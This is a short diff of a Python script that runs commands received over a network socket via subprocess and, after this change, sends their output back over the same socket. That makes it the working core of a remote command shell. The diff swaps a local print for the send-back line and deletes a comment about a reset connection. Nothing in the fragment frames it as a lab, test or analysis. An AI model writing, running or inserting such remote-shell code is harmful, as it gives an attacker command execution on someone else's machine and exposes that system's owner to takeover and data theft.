@@ -21,7 +21,4 @@ print(cmd)
 # Run returned command
 cmdarg = str(cmd).split(" ")
 execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-print(execute.stdout)
-
-# Send the output back - CONNECTION HAS RESET
-# s.sendall(bytes(execute.stdout, "utf-8"))
+s.sendall(bytes(execute.stdout, "utf-8"))
